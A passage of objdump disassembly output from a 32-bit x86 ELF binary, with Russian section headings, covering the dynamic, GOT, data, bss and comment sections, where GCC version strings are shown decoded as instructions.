 8049f3c:	1a 00                	sbb    (%eax),%al
 8049f3e:	00 00                	add    %al,(%eax)
 8049f40:	0c 9f                	or     $0x9f,%al
 8049f42:	04 08                	add    $0x8,%al
 8049f44:	1c 00                	sbb    $0x0,%al
 8049f46:	00 00                	add    %al,(%eax)
 8049f48:	04 00                	add    $0x0,%al
 8049f4a:	00 00                	add    %al,(%eax)
 8049f4c:	f5                   	cmc    
 8049f4d:	fe                   	(bad)  
 8049f4e:	ff 6f ac             	ljmp   *-0x54(%edi)
 8049f51:	81 04 08 05 00 00 00 	addl   $0x5,(%eax,%ecx,1)
 8049f58:	3c 82                	cmp    $0x82,%al
 8049f5a:	04 08                	add    $0x8,%al
 8049f5c:	06                   	push   %es
 8049f5d:	00 00                	add    %al,(%eax)
 8049f5f:	00 cc                	add    %cl,%ah
 8049f61:	81 04 08 0a 00 00 00 	addl   $0xa,(%eax,%ecx,1)
 8049f68:	6e                   	outsb  %ds:(%esi),(%dx)
 8049f69:	00 00                	add    %al,(%eax)
 8049f6b:	00 0b                	add    %cl,(%ebx)
 8049f6d:	00 00                	add    %al,(%eax)
 8049f6f:	00 10                	add    %dl,(%eax)
 8049f71:	00 00                	add    %al,(%eax)
 8049f73:	00 15 00 00 00 00    	add    %dl,0x0
 8049f79:	00 00                	add    %al,(%eax)
 8049f7b:	00 03                	add    %al,(%ebx)
 8049f7d:	00 00                	add    %al,(%eax)
 8049f7f:	00 00                	add    %al,(%eax)
 8049f81:	a0 04 08 02 00       	mov    0x20804,%al
 8049f86:	00 00                	add    %al,(%eax)
 8049f88:	28 00                	sub    %al,(%eax)
 8049f8a:	00 00                	add    %al,(%eax)
 8049f8c:	14 00                	adc    $0x0,%al
 8049f8e:	00 00                	add    %al,(%eax)
 8049f90:	11 00                	adc    %eax,(%eax)
 8049f92:	00 00                	add    %al,(%eax)
 8049f94:	17                   	pop    %ss
 8049f95:	00 00                	add    %al,(%eax)
 8049f97:	00 f0                	add    %dh,%al
 8049f99:	82                   	(bad)  
 8049f9a:	04 08                	add    $0x8,%al
 8049f9c:	11 00                	adc    %eax,(%eax)
 8049f9e:	00 00                	add    %al,(%eax)
 8049fa0:	e8 82 04 08 12       	call   1a0ca427 <_end+0x120803fb>
 8049fa5:	00 00                	add    %al,(%eax)
 8049fa7:	00 08                	add    %cl,(%eax)
 8049fa9:	00 00                	add    %al,(%eax)
 8049fab:	00 13                	add    %dl,(%ebx)
 8049fad:	00 00                	add    %al,(%eax)
 8049faf:	00 08                	add    %cl,(%eax)
 8049fb1:	00 00                	add    %al,(%eax)
 8049fb3:	00 fe                	add    %bh,%dh
 8049fb5:	ff                   	(bad)  
 8049fb6:	ff 6f b8             	ljmp   *-0x48(%edi)
 8049fb9:	82                   	(bad)  
 8049fba:	04 08                	add    $0x8,%al
 8049fbc:	ff                   	(bad)  
 8049fbd:	ff                   	(bad)  
 8049fbe:	ff 6f 01             	ljmp   *0x1(%edi)
 8049fc1:	00 00                	add    %al,(%eax)
 8049fc3:	00 f0                	add    %dh,%al
 8049fc5:	ff                   	(bad)  
 8049fc6:	ff 6f aa             	ljmp   *-0x56(%edi)
 8049fc9:	82                   	(bad)  
 8049fca:	04 08                	add    $0x8,%al
	...

Дизассемблирование раздела .got:

08049ffc <.got>:
 8049ffc:	00 00                	add    %al,(%eax)
	...

Дизассемблирование раздела .got.plt:

0804a000 <_GLOBAL_OFFSET_TABLE_>:
 804a000:	14 9f                	adc    $0x9f,%al
 804a002:	04 08                	add    $0x8,%al
	...
 804a00c:	56                   	push   %esi
 804a00d:	83 04 08 66          	addl   $0x66,(%eax,%ecx,1)
 804a011:	83 04 08 76          	addl   $0x76,(%eax,%ecx,1)
 804a015:	83 04 08 86          	addl   $0xffffff86,(%eax,%ecx,1)
 804a019:	83 04 08 96          	addl   $0xffffff96,(%eax,%ecx,1)
 804a01d:	83                   	.byte 0x83
 804a01e:	04 08                	add    $0x8,%al

Дизассемблирование раздела .data:

0804a020 <__data_start>:
 804a020:	00 00                	add    %al,(%eax)
	...

0804a024 <__dso_handle>:
 804a024:	00 00                	add    %al,(%eax)
	...

Дизассемблирование раздела .bss:

0804a028 <__bss_start>:
 804a028:	00 00                	add    %al,(%eax)
	...

Дизассемблирование раздела .comment:

00000000 <.comment>:
   0:	47                   	inc    %edi
   1:	43                   	inc    %ebx
   2:	43                   	inc    %ebx
   3:	3a 20                	cmp    (%eax),%ah
   5:	28 55 62             	sub    %dl,0x62(%ebp)
   8:	75 6e                	jne    78 <_init-0x80482a0>
   a:	74 75                	je     81 <_init-0x8048297>
   c:	20 34 2e             	and    %dh,(%esi,%ebp,1)
   f:	38 2e                	cmp    %ch,(%esi)
  11:	34 2d                	xor    $0x2d,%al
  13:	32 75 62             	xor    0x62(%ebp),%dh
  16:	75 6e                	jne    86 <_init-0x8048292>
  18:	74 75                	je     8f <_init-0x8048289>
  1a:	31 7e 31             	xor    %edi,0x31(%esi)
  1d:	34 2e                	xor    $0x2e,%al
  1f:	30 34 29             	xor    %dh,(%ecx,%ebp,1)
  22:	20 34 2e             	and    %dh,(%esi,%ebp,1)
  25:	38 2e                	cmp    %ch,(%esi)
  27:	34 00                	xor    $0x0,%al
  29:	47                   	inc    %edi
  2a:	43                   	inc    %ebx
  2b:	43                   	inc    %ebx
  2c:	3a 20                	cmp    (%eax),%ah
  2e:	28 55 62             	sub    %dl,0x62(%ebp)
  31:	75 6e                	jne    a1 <_init-0x8048277>
  33:	74 75                	je     aa <_init-0x804826e>
  35:	20 34 2e             	and    %dh,(%esi,%ebp,1)
  38:	38 2e                	cmp    %ch,(%esi)
  3a:	32 2d 31 39 75 62    	xor    0x62753931,%ch
  40:	75 6e                	jne    b0 <_init-0x8048268>
  42:	74 75                	je     b9 <_init-0x804825f>
  44:	31 29                	xor    %ebp,(%ecx)
  46:	20 34 2e             	and    %dh,(%esi,%ebp,1)
  49:	38 2e                	cmp    %ch,(%esi)
  4b:	32 00                	xor    (%eax),%al
